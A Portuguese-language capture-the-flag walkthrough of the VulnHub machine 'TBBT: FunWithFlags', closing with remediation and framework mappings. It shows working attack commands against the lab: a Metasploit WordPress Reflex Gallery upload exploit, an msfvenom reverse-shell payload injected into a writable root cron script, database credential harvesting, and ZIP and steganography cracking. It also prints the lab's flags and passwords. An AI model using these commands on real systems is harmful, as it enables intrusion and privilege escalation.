# TBBT: FunWithFlags — Bazinga! Sete Flags Escondidas por Pasadena

Boa galera!! TBBT: FunWithFlags é a máquina CTF para quem cresceu assistindo The Big Bang Theory. Sete flags, sete personagens, sete técnicas de esconderijo diferentes. Sheldon está esperando na porta 1337, Amy está dentro de um binário, Penny está codificada em base64, Leonard precisa de um exploit de cron root, Bernadette está trancada num banco de dados, Raj está escondido no WordPress, e Howard precisa que você quebre um ZIP e decodifique esteganografia. Sem mentira, essa máquina ensina uma enorme variedade de técnicas em um único ambiente coeso e temático. Bazinga! Muito obrigado ao criador pelo design criativo das flags.

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | TBBT: FunWithFlags |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/tbbt-funwithflags,437/ |
| **Técnicas** | Enumeração de serviços Nmap, brute-force de diretório web, enumeração WordPress WPScan, Metasploit Reflex Gallery upload de arquivo RCE, extração de strings de binário, decode base64, enumeração de credenciais MySQL, extração de credenciais de banco de dados WordPress, injeção em script cron raiz gravável, acesso FTP anônimo, cracking de senha ZIP (fcrackzip), esteganografia de imagem (stegcracker) |
| **CVEs** | CVE-2015-4133 (upload arbitrário de arquivo WordPress Reflex Gallery), CWE-312 (Armazenamento em Texto Claro de Credenciais: arquivo binário/config), CWE-732 (Atribuição Incorreta de Permissão: script cron gravável pelo mundo) |
| **Grupos APT** | FIN7: usa vulnerabilidades de plugins WordPress para acesso inicial em setores de varejo e hotelaria; APT41: explora vulnerabilidades CMS combinadas com colheita de credenciais de arquivos de configuração para movimentação lateral |

---

## Resumo do Ataque

```
netdiscover → 192.168.1.105
    |
    v
nmap → porta 21 (FTP), 22 (SSH), 80 (HTTP), 1337 (custom)
    |
    v
nc 192.168.1.105 1337 → FLAG 1 (Sheldon)
    |
    v
dirb → /music/wordpress/ → wpscan → plugin Reflex Gallery
    |
    v
MSF: exploit/unix/webapp/wp_reflex_file_upload → Meterpreter (www-data)
    |
    v
/home/amy/secretdiary → strings → FLAG 2 (Amy) + senha P@SSw0rd123Sh3ld0n
    |
    v
/home/penny/.FLAG.penny.txt | base64 -d → FLAG 3 (Penny)
    |
    v
/etc/crontab → root executa /home/leonard/thermostat_set_temp.sh → injetar shell reversa
    |
    v
listener nc → shell root → /root/Flag-leonard.txt → FLAG 4 (Leonard)
    |
    v
/var/www/html/private/db_config.php → bigpharmacorp:weareevil → mysql → FLAG 5 (Bernadette)
    |
    v
/var/www/html/music/wordpress/wp-config.php → mysql footprintsonthemoon → FLAG 6 (Raj)
    |
    v
FTP anônimo → /pub/howard/super_secret_nasa_stuff_here.zip
    → fcrackzip → astronaut → unzip → marsroversketch.jpg
    → stegcracker → iloveyoumom → FLAG 7 (Howard)
```

---

## Metodologia

1. Descoberta de host e scan completo de portas
2. Banner da porta customizada 1337 para primeira flag
3. Brute-force de diretório web e enumeração WordPress
4. Explorar plugin Reflex Gallery para shell Meterpreter
5. Enumerar diretórios home para flags e credenciais
6. Ler e decodificar flag do diretório home da penny
7. Explorar script cron raiz gravável para escalação de privilégios
8. Extrair credenciais de banco de dados de arquivos de configuração
9. Enumerar WordPress e bancos MySQL privados para flags
10. Acesso FTP anônimo, crack de ZIP, esteganografia para flag final

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -p- -A 192.168.1.105
```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.x
80/tcp   open  http    Apache httpd 2.4.x
1337/tcp open  waste?
```

Quatro serviços. Porta 1337 não é padrão e imediatamente suspeita. Em máquinas CTF, portas não padrão sem serviço óbvio frequentemente contêm dados escondidos. Bora conferir!

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Flag 1: Sheldon (Banner na Porta 1337)

Conecte diretamente à porta 1337:

```bash
nc 192.168.1.105 1337
```

```
FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}
```

Bazinga! Primeira flag coletada sem nenhum exploit. Sheldon aprovaria esse nível de simplicidade!

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 3 — Enumeração Web e Descoberta WordPress

```bash
dirb http://192.168.1.105/
```

Descobre `/music/wordpress/`. Enumere a instalação WordPress:

```bash
wpscan --url http://192.168.1.105/music/wordpress/ --enumerate p,u
```

Saída revela:
- Versão WordPress: 4.x (desatualizada)
- Plugin: **Reflex Gallery** (vulnerável a upload arbitrário de arquivo)

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 4 — Exploit Reflex Gallery WordPress (CVE-2015-4133)

O plugin WordPress Reflex Gallery antes da versão 3.1.4 permite upload de arquivo não autenticado. Use o Metasploit:

```bash
msfconsole -q
use exploit/unix/webapp/wp_reflex_file_upload
set RHOSTS 192.168.1.105
set TARGETURI /music/wordpress
set LHOST 192.168.1.103
set LPORT 4444
exploit
```

```
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: www-data

meterpreter > shell
$ cd /home && ls
amy  bernadette  howard  leonard  penny  raj  sheldon
```

Sete diretórios home, um por personagem TBBT. Cada um esconde uma flag. Caramba!

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública

---

## Passo 5 — Flag 2: Amy (Strings de Binário)

```bash
$ cd /home/amy
$ strings secretdiary
```

Saída revela:

```
Password: P@SSw0rd123Sh3ld0n
FLAG-amy{60263777358690b90e8dbe8fea6943c9}
```

O binário `secretdiary` tem credenciais em texto claro e uma flag embutida em sua tabela de strings. O comando `strings` extrai texto imprimível de arquivos binários, incluindo credenciais hardcoded.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos

---

## Passo 6 — Flag 3: Penny (Arquivo Codificado em Base64)

```bash
$ cd /home/penny
$ cat .FLAG.penny.txt | base64 -d
FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}
```

A flag está codificada em base64 em um arquivo oculto (prefixado com `.` para ser menos visível na saída padrão do `ls`). Sempre use `ls -la` para ver arquivos ocultos, véi!

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 7 — Flag 4: Leonard (Injeção em Script Cron Raiz)

Verifique o crontab do sistema:

```bash
$ cat /etc/crontab
* * * * * root /home/leonard/thermostat_set_temp.sh
```

Um trabalho cron raiz executa `thermostat_set_temp.sh` a cada minuto. Verifique as permissões:

```bash
$ ls -la /home/leonard/thermostat_set_temp.sh
-rwxrwxrwx 1 leonard leonard 35 thermostat_set_temp.sh
```

Gravável pelo www-data. Injete um payload de shell reversa:

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.103 LPORT=1234 -f raw > /tmp/payload.sh
upload /tmp/payload.sh /home/leonard/thermostat_set_temp.sh
```

Inicie um listener netcat no atacante:

```bash
nc -lvnp 1234
```

Aguarde até 60 segundos. O cron dispara como root:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/Flag-leonard.txt
# FLAG-leonard{17fc95224b65286941c54747704acd3e}
```

**MITRE ATT&CK:** T1053.003 — Tarefa Agendada: Cron; T1548 — Abuso do Mecanismo de Controle de Elevação

---

## Passo 8 — Flag 5: Bernadette (Credenciais de Banco de Dados)

```bash
$ cat /var/www/html/private/db_config.php
```

```php
$db_user = "bigpharmacorp";
$db_pass = "weareevil";
$db_name = "bigpharmacorp";
```

Conecte ao MySQL:

```bash
mysql -u bigpharmacorp -pweareevil
```

```sql
use bigpharmacorp;
select * from users;
```

```
FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}
```

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1213 — Dados de Repositórios de Informações

---

## Passo 9 — Flag 6: Raj (Banco de Dados WordPress)

```bash
$ cat /var/www/html/music/wordpress/wp-config.php
```

```
DB_USER: footprintsonthemoon
DB_PASSWORD: footprintsonthemoon1337
```

```bash
mysql -u footprintsonthemoon -pfootprintsonthemoon1337
```

```sql
use footprintsonthemoon;
select * from wp_posts where post_status = 'private';
```

```
FLAG-raz{40d17a74e28a62eac2df19e206f0987c}
```

Nota: a flag diz "raz" mas o personagem é Raj. É um typo na máquina, não é erro seu.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos

---

## Passo 10 — Flag 7: Howard (FTP Anônimo + Crack ZIP + Esteganografia)

```bash
ftp 192.168.1.105
# Usuário: anonymous
# Senha: (pressione Enter)

ftp> cd pub/howard
ftp> get super_secret_nasa_stuff_here.zip
ftp> quit
```

Quebre a senha do ZIP:

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt super_secret_nasa_stuff_here.zip
```

```
PASSWORD FOUND!!!!: pw == astronaut
```

Extraia o ZIP:

```bash
unzip -P astronaut super_secret_nasa_stuff_here.zip
# Extrai: marsroversketch.jpg
```

Extraia dados ocultos da imagem com esteganografia:

```bash
stegcracker marsroversketch.jpg /usr/share/wordlists/rockyou.txt
```

```
Extracted payload: 'iloveyoumom' was successful!
```

```bash
cat marsroversketch.jpg.out
# FLAG-howard{...}
```

A flag do Howard está escondida dentro de um JPEG usando esteganografia, atrás de uma senha ZIP, dentro de um servidor FTP anônimo. Três camadas para a última flag! Top demais!

**MITRE ATT&CK:** T1027 — Arquivos ou Informações Ofuscados; T1021.003 — Serviços Remotos: FTP

---

## Flags, Hashes e Credenciais Capturados

| Personagem | Flag | Encontrado em | Técnica |
|---|---|---|---|
| Sheldon | `FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}` | Banner porta 1337 | Conexão direta |
| Amy | `FLAG-amy{60263777358690b90e8dbe8fea6943c9}` | /home/amy/secretdiary | Strings de binário |
| Penny | `FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}` | /home/penny/.FLAG.penny.txt | Decode base64 |
| Leonard | `FLAG-leonard{17fc95224b65286941c54747704acd3e}` | /root/Flag-leonard.txt | Injeção script cron |
| Bernadette | `FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}` | MySQL BD bigpharmacorp | Extração credencial BD |
| Raj | `FLAG-raz{40d17a74e28a62eac2df19e206f0987c}` | MySQL BD WordPress | Credenciais wp-config.php |
| Howard | Na saída do steg | FTP + ZIP + steg JPEG | Extração multi-camada |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Serviço debug/teste na porta 1337 expõe flag | Desenvolvedores deixam listeners de teste abertos em ambientes de produção | Audite todas as portas abertas; feche serviços não produtivos antes do deploy |
| 2 | Plugin WordPress desatualizado (Reflex Gallery) permite RCE | CVE-2015-4133 tem mais de 10 anos mas ainda é encontrado em produção | Mantenha todos os plugins CMS atualizados; remova plugins não utilizados |
| 3 | Credenciais hardcoded em binário executável | Extração de strings binárias é trivialmente rápida | Nunca hardcode credenciais; use variáveis de ambiente ou gerenciamento de segredos |
| 4 | Script cron gravável pelo mundo executado como root | Vetor clássico e confiável de escalação de privilégios | Todos os scripts cron: propriedade do root, permissões 700 ou 750 |
| 5 | Credenciais de banco de dados em arquivos de configuração PHP | wp-config.php e db_config.php são alvos de alto valor | Restrinja permissões de arquivo; mova configs acima da webroot |
| 6 | FTP anônimo com arquivos sensíveis | Acesso FTP anônimo é obsoleto; ainda amplamente habilitado | Desative FTP anônimo; use SFTP com autenticação |
| 7 | Esteganografia em imagens hospedadas no FTP | Usado por APT32 e outros para C2 encoberto e ocultação de dados | Inspeção profunda de conteúdo; detecção de steg em soluções DLP |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Execução | Execução | Intérprete de Comando e Script: Shell Unix | T1059.004 |
| Persistência | Persistência | Componente de Software do Servidor: Web Shell | T1505.003 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Persistência | Persistência | Tarefa Agendada: Cron | T1053.003 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso do Mecanismo de Controle de Elevação | T1548 |
| Coleta | Coleta | Dados de Repositórios de Informações | T1213 |
| Evasão de Defesa | Evasão de Defesa | Arquivos ou Informações Ofuscados | T1027 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Feche a porta 1337:** sem serviços debug ou teste em produção
2. **Atualize WordPress e todos os plugins:** especialmente remova ou atualize o Reflex Gallery
3. **Elimine credenciais hardcoded:** use variáveis de ambiente ou gerenciadores de segredos
4. **Corrija permissões do script cron:** `chown root:root /home/leonard/thermostat_set_temp.sh && chmod 700 /home/leonard/thermostat_set_temp.sh`
5. **Restrinja permissões do arquivo de configuração de banco de dados:** `chmod 640 wp-config.php db_config.php`
6. **Desative FTP anônimo:** `anonymous_enable=NO` em vsftpd.conf; use SFTP
7. **Implemente DLP com detecção de steg:** sinalize arquivos de imagem suspeitos em fluxos de dados

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventarie todos os serviços incluindo portas não padrão |
| Proteger | Controle de Acesso | Remova FTP anônimo; restrinja permissões de configuração de banco de dados |
| Proteger | Segurança de Dados | Sem credenciais em arquivos acessíveis a contas de serviço |
| Detectar | Anomalias e Eventos | Alerte sobre novos arquivos na raiz web; anomalias de execução cron |
| Responder | Planejamento de Resposta | Remova webshells; rotacione todas as credenciais encontradas |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restrinja acesso de escrita em scripts cron; sem FTP anônimo |
| AC-6 | Menor Privilégio | www-data não deve escrever em scripts cron de outros usuários |
| CM-7 | Menor Funcionalidade | Desative serviço debug porta 1337; desative FTP anônimo |
| IA-5 | Gerenciamento de Autenticadores | Sem credenciais hardcoded; use gerenciamento de segredos |
| SI-2 | Remediação de Falhas | Corrija CVE-2015-4133 (Reflex Gallery) imediatamente |

### CISA KEV

CVE-2015-4133 (upload de arquivo WordPress Reflex Gallery) foi explorado em múltiplos comprometimentos em massa do WordPress. Atualize imediatamente conforme orientação de gerenciamento de vulnerabilidades da CISA.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Fortalecimento de Configuração de Aplicação (corrija Reflex Gallery; feche portas debug)
- **D3-OAM** — Gerenciamento Administrativo do SO (corrija permissões cron)
- **D3-FH** — Hashing de Arquivo (FIM na raiz web e scripts cron)
- **D3-HBPI** — Fortalecer Integridade do Pipeline de Build (sem credenciais hardcoded em deployments)

---

## Considerações Finais

Mano, TBBT: FunWithFlags é uma joia absoluta de máquina CTF. O design temático te mantém engajado enquanto você caça a flag de cada personagem usando uma técnica diferente. Sheldon precisa de uma conexão simples, Howard precisa de três camadas de extração, e todo mundo no meio requer uma habilidade específica. A amplitude de técnicas cobertas (exploit web, análise binária, codificação, abuso de cron, enum de banco de dados, FTP, esteganografia) torna essa uma das melhores máquinas de treinamento para iniciantes que querem exposição a uma superfície de ataque ampla em uma única sessão. Bazinga! GG rapaziada!

Thanks guys!! (❍ᴥ❍ʋ)
